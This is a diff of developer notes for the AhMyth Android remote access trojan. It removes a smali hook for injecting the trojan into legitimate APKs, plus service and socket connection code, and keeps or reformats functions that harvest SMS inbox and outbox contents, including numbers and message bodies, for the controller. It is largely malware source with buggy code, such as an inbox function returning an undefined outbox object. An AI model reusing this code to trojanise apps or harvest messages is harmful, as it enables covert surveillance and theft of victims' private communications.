@@ -1,387 +1,93 @@
-## Code Sets for new static hook function
-
-The code for this new future function was taken from [Rapid7/metasploit-payloads](https://github.com/rapid7/metasploit-payloads), specifically their [androidpayload](https://github.com/Morsmalleo/metasploit-payloads/tree/master/java/androidpayload/app/src/com/metasploit/stage) directory.
-
-the files the coding for this new function were taken from in the **androidpayload** directory of the **metasploit-framework** repository are as follows;
-- MainActivity.java
-- MainService.java
-- MainBroadcastReceiver.java
-- Payload.java
-#
-- New Hook function to be injected into APK's
-```smali
-invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V
-```
-- Progaurd-rules.pro
-```pro
-
--keep public class * extends android.app.Activity
-
--keep public class * extends android.app.Service
-
--keep public class * extends android.content.BroadcastReceiver
-
--keep class ahmyth.mine.king.ahmyth.MainService {
-
-    public static <methods>;
-
-}
-
--keep class ahmyth.mine.king.ahmyth.ConnectionManager {
-
-    public static <methods>;
-
-}
-
--optimizationpasses 5
-
--verbose
-
-```
-- Service Start for MainActivity.java File
-```java
-MainService.startService(this);
-```
-- Service start for MyReciever.java Code
-```java
-MainService.startService(context);
-```
-- New MainService.java Code
-```java
-package ahmyth.mine.king.ahmyth;
-
-import android.app.AlarmManager;
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.app.PendingIntent;
-import android.app.Service;
-import android.content.Context;
-import android.content.Intent;
-import android.graphics.Color;
-import android.os.Build;
-import android.os.Handler;
-import android.os.IBinder;
-import android.os.Looper;
-import android.support.annotation.RequiresApi;
-import android.support.v4.app.NotificationCompat;
-
-import java.lang.reflect.Method;
-
-public class MainService extends Service {
-    private static Context contextOfApplication;
-
-        private static void findContext() throws Exception {
-            Class<?> activityThreadClass;
-            try {
-                activityThreadClass = Class.forName("android.app.ActivityThread");
-            } catch (ClassNotFoundException e) {
-                // No context
-                return;
-            }
-
-            final Method currentApplication = activityThreadClass.getMethod("currentApplication");
-            final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-            if (context == null) {
-                // Post to the UI/Main thread and try and retrieve the Context
-                final Handler handler = new Handler(Looper.getMainLooper());
-                handler.post(new Runnable() {
-                    public void run() {
-                        try {
-                            Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-                            if (context != null) {
-                                startService(context);
-                            }
-                        } catch (Exception ignored) {
-                        }
-                    }
-                });
-            } else {
-                startService(context);
-            }
-        }
-
- 
-
-        // static smali hook that gets injected into 
-        // an original, legit APK
-        public static void start() {
-            try {
-                findContext();
-            } catch (Exception ignored) {
-            }
-        }
-
-        public static void startService(Context context) {
-            context.startService(new Intent(context, MainService.class));
-        }
-```
-- New ConnectionManager.java Code
-```java
-package ahmyth.mine.king.ahmyth;
-
-import org.json.JSONObject;
-import io.socket.emitter.Emitter;
-
-import android.content.Context;
-import android.util.Log;
-import android.os.Looper;
-import android.os.Handler;
-
-import java.lang.reflect.Method;
-
-/**
- * Created by AhMyth on 10/1/16.
- */
-
-/**
- * Updated by Morsmalleo
- */
-
-
-
-public class ConnectionManager {
-
-    public static Context context;
-
-    private static io.socket.client.Socket ioSocket;
-
-    private static FileManager fm = new FileManager();
-
-    public static void startAsync(Context con)
-
-    {
-
-        try {
-
-            ConnectionManager.context = con;
-
-            sendReq();
-
-        }catch (Exception ex){
-
-            startAsync(con);
-
-        }
-
-    }
-
-    public static void startContext() {
-
-        try {
-
-            findContext();
-
-        } catch (Exception ignored) {
-
-        }
-
-    }
-
-    private static void findContext() throws Exception {
-
-        Class<?> activityThreadClass;
-
-        try {
-
-            activityThreadClass = Class.forName("android.app.ActivityThread");
-
-        } catch (ClassNotFoundException e) {
-
-            // No context
-
-            return;
-
-        }
-
-        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
-
-        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-
-        if (context == null) {
-
-            // Post to the UI/Main thread and try and retrieve the Context
-
-            final Handler handler = new Handler(Looper.getMainLooper());
-
-            handler.post(new Runnable() {
-
-                public void run() {
-
-                    try {
-
-                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-
-                        if (context != null) {
-
-                            startAsync(context);
-
-                        }
-
-                    } catch (Exception ignored) {
-
-                    }
-
-                }
-
-            });
-
-        } else {
-
-            startAsync(context);
-
-        }
-
-    }
-```
 ## Updated SMS Manager.
 ```java
-    public static JSONObject getSMSInboxList(){
+public static JSONObject getSMSInboxList(){
 
-        try {
+    try {
 
-            JSONObject SMSInboxList = new JSONObject();
+        JSONObject SMSInboxList = new JSONObject();
 
-            JSONArray list = new JSONArray();
+        JSONArray list = new JSONArray();
 
-            Uri uriSMSURI = Uri.parse("content://sms/inbox");
+        Uri uriSMSURI = Uri.parse("content://sms/inbox");
 
-            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);
+        Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);
 
-            while (cur.moveToNext()) {
+        while (cur.moveToNext()) {
 
-                JSONObject sms = new JSONObject();
+            JSONObject sms = new JSONObject();
 
-                String address = cur.getString(cur.getColumnIndex("address"));
+            String address = cur.getString(cur.getColumnIndex("address"));
 
-                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
+            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
 
-                sms.put("phoneNo" , address);
+            sms.put("phoneNo" , address);
 
-                sms.put("msg" , body);
+            sms.put("msg" , body);
 
-                list.put(sms);
-
-            }
-
-            SMSInboxList.put("smsList", list);
-
-            Log.e("done" ,"collecting");
-
-            return SMSOutboxList;
-
-        } catch (JSONException e) {
-
-            e.printStackTrace();
+            list.put(sms);
 
         }
 
-        return null;
+        SMSInboxList.put("smsInboxList", list);
 
-    }
-    
-        public static JSONObject getSMSOutboxList(){
+        Log.e("done" ,"collecting");
 
-        try {
+        return SMSOutboxList;
 
-            JSONObject SMSOutboxList = new JSONObject();
+    } catch (JSONException e) {
 
-            JSONArray list = new JSONArray();
-
-            Uri uriSMSURI = Uri.parse("content://sms/outbox");
-
-            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);
-
-            while (cur.moveToNext()) {
-
-                JSONObject sms = new JSONObject();
-
-                String address = cur.getString(cur.getColumnIndex("address"));
-
-                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
-
-                sms.put("phoneNo" , address);
-
-                sms.put("msg" , body);
-
-                list.put(sms);
-
-            }
-
-            SMSOutboxList.put("smsList", list);
-
-            Log.e("done" ,"collecting");
-
-            return SMSOutboxList;
-
-        } catch (JSONException e) {
-
-            e.printStackTrace();
-
-        }
-
-        return null;
-
-    }
-```
-## Permissions Management
-
-- PermissionsManager.java
-
-```java
-
-package ahmyth.mine.king.ahmyth;
-
-import android.content.pm.PackageInfo;
-
-import android.content.pm.PackageManager;
-
-import org.json.JSONArray;
-
-import org.json.JSONObject;
-
-import static ahmyth.mine.king.ahmyth.ConnectionManager.context;
-
-public class PermissionManager {
-
-    public static JSONObject getGrantedPermissions() {
-
-        JSONObject data = new JSONObject();
-
-        try {
-
-            JSONArray perms = new JSONArray();
-
-            PackageInfo pi = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
-
-            for (int i = 0; i < pi.requestedPermissions.length; i++) {
-
-                if ((pi.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0) perms.put(pi.requestedPermissions[i]);
-
-            }
-
-            data.put("permissions", perms);
-
-        } catch (Exception e) {
-
-        }
-
-        return data;
+        e.printStackTrace();
 
     }
 
-    public static boolean canIUse(String perm) {
-
-        if(context.getPackageManager().checkPermission(perm, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) return true;
-
-        else return false;
-
-    }
+    return null;
 
 }
 
-```
+public static JSONObject getSMSOutboxList(){
 
+    try {
+
+        JSONObject SMSOutboxList = new JSONObject();
+
+        JSONArray list = new JSONArray();
+
+        Uri uriSMSURI = Uri.parse("content://sms/outbox");
+
+        Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);
+
+        while (cur.moveToNext()) {
+
+            JSONObject sms = new JSONObject();
+
+            String address = cur.getString(cur.getColumnIndex("address"));
+
+            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
+
+            sms.put("phoneNo" , address);
+
+            sms.put("msg" , body);
+
+            list.put(sms);
+
+        }
+
+        SMSOutboxList.put("smsOutboxList", list);
+
+        Log.e("done" ,"collecting");
+
+        return SMSOutboxList;
+
+    } catch (JSONException e) {
+
+        e.printStackTrace();
+
+    }
+
+    return null;
+
+}
+```
 ## List Installed apps
 
 - AppList.java
